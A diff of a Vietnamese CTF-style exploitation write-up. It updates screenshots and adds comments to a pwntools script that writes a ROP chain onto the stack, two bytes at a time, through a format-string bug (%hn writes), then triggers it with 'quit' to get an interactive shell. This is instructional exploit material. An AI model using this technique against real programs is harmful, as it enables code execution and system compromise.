@@ -244,7 +244,7 @@ Stack từ rip trông như sau:
 * và overwrite từng đấy byte vào memory block 8-byte
 * cuối cùng "quit" để `rsp` -> `rip` trỏ và thực thi payload
 
-<img width="800" height="584" alt="pop rdi2" src="https://github.com/user-attachments/assets/af53bf7a-c5a7-49fa-8465-8867a93b5ea6" />
+<img width="806" height="576" alt="pop rdi" src="https://github.com/user-attachments/assets/bbf6cef9-9620-4adc-bf89-81d8d497df68" />
 
 <img width="800" height="584" alt="pop rdi2" src="https://github.com/user-attachments/assets/d5ee38a8-48f5-4de0-8b0a-f7f0df64b3bc" />
 
@@ -294,10 +294,11 @@ ret_addr = buffer_leak + 0x48
 
 # overwrite stack
 for i, rop_gad in enumerate(chain):
-    addr_block = ret_addr + (i * 8)
+    addr_block = ret_addr + (i * 8) # rip (8byte) + 8 bytes + 8 bytes + 8 bytes
     
     for j in range(3):
-        part = (rop_gad >> (16 * j)) & 0xffff
+        # laays 2 bytes rop_gadget nhets vao 2-byte addr_block
+        part = (rop_gad >> (16 * j)) & 0xffff  
         position = addr_block + (j * 2)
         
         payload = f'%{part}c%8$hn'.encode()
@@ -307,13 +308,15 @@ for i, rop_gad in enumerate(chain):
         p.sendline(payload)
         p.clean(timeout=0.1)
 
-# quit
+# quit - kich hoat paylaod
 p.sendline(b'quit') 
 
 p.interactive()
 ```
 
+Và nhận được interactive shell:
 
+<img width="808" height="259" alt="image" src="https://github.com/user-attachments/assets/4b351a73-f30e-4866-bdbe-c72853273035" />
 
 
 
